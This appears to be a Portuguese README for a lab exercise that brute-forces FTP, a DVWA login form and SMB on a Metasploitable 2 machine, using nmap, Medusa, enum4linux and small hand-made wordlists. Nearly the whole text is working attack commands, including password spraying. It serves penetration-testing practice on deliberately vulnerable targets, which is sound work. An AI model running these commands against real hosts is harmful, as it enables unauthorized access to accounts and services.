# DesafioBruteForce
Projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

# Descobirnfo IP da máquina
Comando "ip a" para descobrir o IP da máquina no metasploitable

# No Kali executar teste de conexão
"ping -c 3 192.168.56.103"     realizar teste de conexão

# Verificando portas com o NMAP
"nmap -sV -p 21,22,80,445,139 192.168.56.103" verificar as portas que estão abertas

# Criação dos arquivos com usuários e senhas para usar o força bruta
"echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt" gerar o arquivo com as senhas
"echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt" gerar o arquivo com os usuarios

# Testando as wordlists ftp
"medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6" comando medusa testar usuarios e senhas

# Acessando com o usuário e senha encontrados o ftp
"ftp 192.168.56.103" acessar o ftp

# Usando o medusa para descobrir usuário e senha se um login http
"medusa -h 192.168.56.103 -U users.txt -P pass.txt -M http \ -m PAGE:'/dvwa/login.php' \ -m FORM: 'username=^USER&password=^PASS^&Login=Login' \ -m 'FAIL=Login failed' -t 6"

# enumerando os usarios reais da máquina e salvando em um arquivo
"enum4linux -a 192.168.56.103 | tee enum4_output.txt" enumerar portas e usuários
"less enum4_output.txt ler a saida" lendo os dados

# Criando wordlist com os usuários descobertos
echo -e 'user\nmsfadmin\nservice' > smb_users.txt gerar o arquivo com os usuarios
echo -e '123456\npassword\nWelcome123\nmsfadmin' > senhas_spray.txt  

# Realizando o ataque com o password spraying

"medusa -h 192.168.56.103 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 "

# Testando o acesso ao SMB
smbclient -L //192.168.56.103 -U msfadmin testar o acesso
